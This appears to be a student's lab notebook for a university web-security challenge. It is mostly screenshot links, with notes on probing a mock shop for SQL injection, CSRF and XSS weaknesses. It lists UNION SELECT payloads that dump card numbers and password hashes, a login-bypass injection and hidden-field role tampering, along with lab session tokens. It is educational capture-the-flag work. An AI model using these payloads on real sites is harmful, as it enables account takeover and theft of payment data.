# Connecting to the lab environment

ssh -4 -D 9090 -p 10001 hacker22@warhead.khoury.northeastern.edu

# Understanding challenge 

![[Pasted image 20260530103509.png]]

![[Pasted image 20260530104203.png]]

![[Pasted image 20260530104345.png]]
![[Pasted image 20260530104357.png]]
![[Pasted image 20260530120356.png]]


![[Pasted image 20260530120323.png]]

First change of thought it says SQLi, XSS, and CSRF in action.

## Inspect I 
![[Pasted image 20260530120837.png]]
My hacker token is remebered. 
![[Pasted image 20260530120911.png]]
HttpOnly:true

Remembering from classnotes: If you set httponly = true that means cookie cannot be sent through document.cookie() or javascript 


## Purchase an item with an account you create.

### Inspecting input 

![[Pasted image 20260601124105.png]]

![[Pasted image 20260601133906.png]]

session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJObyBjYXJkIG9uIGZpbGUuIEFkZCBvbmUgaW4geW91ciBwcm9maWxlLiJdfV19.ah3DUg.ZUjVirDmf_kHh8nAz2z-RiiOLs8

![[Pasted image 20260601124900.png]]

![[Pasted image 20260601124925.png]]
![[Pasted image 20260601125002.png]]


![[Pasted image 20260601124941.png]]

### Inspecting I the first page 

![[Pasted image 20260601125142.png]]

All the src images seem fine

Comments get posted 
![[Pasted image 20260601130238.png]]

###  Comment section input 

![[Pasted image 20260601133721.png]]


![[Pasted image 20260601133706.png]]
 

### Inspecting I the second  page 

![[Pasted image 20260601130407.png]]

  ### Playing with XSS

![[Pasted image 20260601162952.png]]


![[Pasted image 20260601162818.png]]

###  Cart 

![[Pasted image 20260601133751.png]]

If i click on 1-Click Buy! 

![[Pasted image 20260601134055.png]]

The error can be inspected like a GET request 
![[Pasted image 20260601134327.png]]

There is a Role 

![[Pasted image 20260601134403.png]]


###  CSRF Token 

#### The csrf_token is in two places: 

one is near click buy 

![[Pasted image 20260601133311.png]]

Other one is here near comments

![[Pasted image 20260601133440.png]]


#### Card details are through hidden input 

https://www.w3schools.com/tags/att_input_type_hidden.asp

![[Pasted image 20260601135252.png]]

####  More SQL injection in the update profile 

cb1745f79417a77bfd308b6f15aeb3ef82a3f26a5a224404ebbb60790fe5302e

![[Pasted image 20260602135423.png]]

### Profile page 

![[Pasted image 20260601134845.png]]

![[Pasted image 20260601134914.png]]

BuyerAccount has an id associated 6a507996c0c037f005b730ebf26542a1162cb3a223cd602f40cfc4228528a93b

If i play with the account id and remove it gives me access denied 

![[Pasted image 20260602120408.png]]

![[Pasted image 20260601135031.png]]
![[Pasted image 20260601135047.png]]
![[Pasted image 20260601135108.png]]


### Playing with card details 

![[Pasted image 20260601135454.png]]

![[Pasted image 20260601135506.png]]

When i change the password it is a GET request. 

![[Pasted image 20260601135549.png]]

![[Pasted image 20260601135627.png]]
![[Pasted image 20260601135648.png]]

#### Checking for XSS

![[Pasted image 20260601163321.png]]

### Let us try buying through fake user card 

#### Quick observation csrf token gets passed whenever you try to buy 

![[Pasted image 20260601135840.png]]

#### Role id gets returned 

![[Pasted image 20260601140303.png]]


![[Pasted image 20260601140231.png]]

![[Pasted image 20260601141127.png]]

![[Pasted image 20260601141311.png]]

![[Pasted image 20260601141528.png]]

![[Pasted image 20260601141903.png]]

![[Pasted image 20260601141934.png]]

![[Pasted image 20260601142040.png]]
![[Pasted image 20260601142101.png]]

![[Pasted image 20260601163110.png]]

### Messages 
![[Pasted image 20260601142520.png]]
![[Pasted image 20260601142626.png]]

![[Pasted image 20260601142605.png]]

![[Pasted image 20260601142715.png]]

![[Pasted image 20260601142731.png]]

![[Pasted image 20260601142747.png]]

![[Pasted image 20260601142814.png]]

### Trying XSS 

![[Pasted image 20260601163844.png]]

![[Pasted image 20260601163901.png]]

#### Doesn;t work gives me this error of unknown user 

![[Pasted image 20260601173623.png]]

### Trying SQL Injection in messages 

![[Pasted image 20260604144017.png]]

UNION SELECT 1,sql,3 FROM sqlite_master--

![[Pasted image 20260604144731.png]]

![[Pasted image 20260604144939.png]]

![[Pasted image 20260604144958.png]]

after=1778005670 UNION SELECT 1,sql,3 FROM sqlite_master--

Values that I know card_id 
**card_name**

UNION SELECT card_id,2,3 FROM cards--

![[Pasted image 20260604145829.png]]

![[Pasted image 20260604150039.png]]

![[Pasted image 20260604150257.png]]

![[Pasted image 20260604150407.png]]

UNION SELECT 1,card_name,card_no FROM cards--
UNION SELECT 1,item_name,users FROM items--

![[Pasted image 20260604161128.png]]

**Kaan Onar**

73647582349006746185

![[Pasted image 20260604161315.png]]

UNION SELECT card_id INTEGER PRIMARY KEY, user_id INTEGER, card_name TEXT, card_no TEXT, FROM cards--

The CREATE TABLE statement is the **schema definition**, not the column names to put in your SELECT

**it is returning number from the first column**


####  Why `1` works in position 1

The original query returns a **real timestamp** (like `1778005670`) in column 1, which the app renders as a date. When you inject `UNION SELECT 1,...)`, the app tries to render `1` as a timestamp too.

`1` is a valid integer → converts to `1969-12-31T19:00:01` (Unix epoch + 1 second) → **no crash**.

That's exactly why you kept seeing `1969-12-31T19:00:01` in all your successful injections — it's just the number `1` being interpreted as a Unix timestamp!

#### Why `password` and `user_name` crashed

They're TEXT strings → app tries to parse them as a timestamp → crash → 500.

####  The mental model for next time

When you get a 500 on a working UNION, ask:

**"What does the original query put in that column position?"**

|Original column type|What you can inject there|
|---|---|
|INTEGER|integers only (`1`, `2`, actual numeric columns)|
|TEXT|anything — strings, concatenations|
|TIMESTAMP|integers only (Unix epoch)|

#### The rule of thumb

Always first confirm which positions accept text vs integers using your dummy values:

```sql
UNION SELECT 'a',2,3--    -- if 500 → position 1 is integer-only
UNION SELECT 1,'a',3--    -- if works → position 2 accepts text ✅
```

That tells you which slots are safe to dump text data into before you target real columns.
### CSRF Token manipulation 


![[Pasted image 20260602150207.png]]
![[Pasted image 20260602150242.png]]

which makes me realize that it takes the user id. 

I had created a user tani myself  

![[Pasted image 20260602150339.png]]

![[Pasted image 20260602150421.png]]

Things I am observing the GET request and the POST request have this in common. 

28251da03e59a20613c7195c43bd5fa2fed23c93d101824931db0088f668f4fb


session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIk1lc3NhZ2Ugc2VudC4iXX1dfQ.ah8o6A.cI43_7EmVDTepNWSM3a_FTB-FJQ


csrf_token=cb1745f79417a77bfd308b6f15aeb3ef82a3f26a5a224404ebbb60790fe5302e

![[Pasted image 20260604143934.png]]


I tried removing the CSRF token thing it gives this. 

![[Pasted image 20260601145835.png]]

The CSRF token that i see here in the response is different 

1efe2104df01ab7f43b1ebc24c58089e81046eecf147e45799505bfe254da520

![[Pasted image 20260601150405.png]]

## Messages part 


![[Pasted image 20260604142602.png]]

UNION SELECT 1,2,3 FROM sqlite_master--

## There is a user bob who does a lot of talking, but no buying. Make bob buy something.
### SQL injection to login to bob. 

SELECT * FROM users WHERE username = 'bob’ - -’ AND password = 'anything';

https://www.sentinelone.com/cybersecurity-101/cybersecurity/types-of-sql-injection/


![[Pasted image 20260531154710.png]]


https://infosecwriteups.com/from-sql-injection-to-weak-passwords-a-deep-dive-into-a-tamil-nadu-government-security-flaw-1b648d62d457
![[Pasted image 20260531155053.png]]



### SQL injection in login 


![[Pasted image 20260602113103.png]]

### Trying to login from bob with previous successful SQL injection 

UNION SELECT 1,user_name,password FROM users--

![[Pasted image 20260605112115.png]]

![[Pasted image 20260605112144.png]]

![[Pasted image 20260605112157.png]]

**bob**
c00f1cd79cb8cf5507f8c3484c2d300c6aac2ea8f4f606987789662f7e5c7b72

This is the hash value i guess 
## Delete one of the items originally listed for sale

Exploiting the input type="hidden" 

https://www.w3schools.com/tags/att_input_type_hidden.asp

In the post update profile you can see this make_mode is being passed 

![[Pasted image 20260602145708.png]]

I tried sending it as bob and admin it gave me this 

![[Pasted image 20260602140757.png]]

![[Pasted image 20260602141840.png]]
![[Pasted image 20260602142014.png]]
![[Pasted image 20260602142110.png]]

![[Pasted image 20260602145831.png]]

and i can delete through this. 

## List a new item for sale with an account you create

To become a seller you need to click on this. Also when you are a moderator which we did for deleting an itemr you can;t see the want to sell part. 


![[Pasted image 20260605110548.png]]

![[Pasted image 20260604162735.png]]
![[Pasted image 20260604162817.png]]

What if I play with the GET request 


I retrieved the seller_id 

![[Pasted image 20260605144415.png]]
![[Pasted image 20260605145638.png]]
UNION SELECT 1,2,user_id FROM cards--

UNION SELECT 1,user_name,user_id FROM users--
![[Pasted image 20260605150006.png]]

Now I know 2,3,6 are seller id 

let me try these iterations 

![[Pasted image 20260605144010.png]]

Changed the seller name in these responses. 